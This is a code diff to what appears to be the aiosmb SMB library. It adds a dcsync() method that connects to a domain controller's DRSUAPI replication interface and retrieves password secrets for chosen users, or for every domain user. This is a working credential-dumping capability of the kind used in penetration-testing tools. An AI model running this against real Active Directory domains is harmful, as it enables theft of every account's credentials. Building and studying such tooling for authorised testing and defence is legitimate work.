@@ -1,4 +1,5 @@
 
+from aiosmb import logger
 import asyncio
 from aiosmb.filesystem import SMBFileSystem
 from aiosmb.commons.interfaces.share import SMBShare
@@ -6,6 +7,7 @@ from aiosmb.commons.interfaces.session import SMBUserSession
 from aiosmb.dcerpc.v5.interfaces.srvsmgr import SMBSRVS
 from aiosmb.dcerpc.v5.interfaces.samrmgr import SMBSAMR
 from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSAD
+from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
 from aiosmb.dcerpc.v5.interfaces.servicemanager import SMBRemoteServieManager
 from aiosmb.filereader import SMBFileReader
 
@@ -108,7 +110,6 @@ class SMBMachine:
 		elif service_name.upper() == 'LSAD':
 			self.lsad = LSAD(self.connection)
 			await self.lsad.connect()
-
 		else:
 			raise Exception('Unknown service name : %s' % service_name)
 
@@ -144,6 +145,7 @@ class SMBMachine:
 			self.domains.append(domain)
 			yield domain
 	
+	@req_samr_gen
 	async def list_localgroups(self):
 		async for group in self.list_groups('Builtin'):
 			yield group
@@ -219,6 +221,43 @@ class SMBMachine:
 	async def list_services(self):
 		async for service in self.servicemanager.list():
 			yield service
+
+
+	@req_samr_gen
+	async def dcsync(self, target_domain = None, target_users = []):		
+		
+		if target_domain is None:
+			logger.debug('No domain defined, fetching it from SAMR')
+					
+							
+			logger.debug('Fetching domains...')
+			async for domain in self.samr.list_domains():
+				if domain == 'Builtin':
+					continue
+				if target_domain is None: #using th first available
+					target_domain = domain
+					logger.debug('Domain available: %s' % domain)
+		
+		async with SMBDRSUAPI(self.connection, target_domain) as drsuapi:
+			try:
+				await drsuapi.connect()
+				await drsuapi.open()
+			except Exception as e:
+				logger.exception('Failed to connect to DRSUAPI!')
+				raise e
+
+			logger.debug('Using domain: %s' % target_domain)
+			if len(target_users) > 0:
+				for username in target_users:
+					secrets = await drsuapi.get_user_secrets(username)
+					yield secrets
+							
+			else:
+				domain_sid = await self.samr.get_domain_sid(target_domain)
+				domain_handle = await self.samr.open_domain(domain_sid)
+				async for username, user_sid in self.samr.list_domain_users(domain_handle):
+					secrets = await drsuapi.get_user_secrets(username)
+					yield secrets
 
 	#placeholder for later implementations...
 	async def save_registry(self, hive_name):
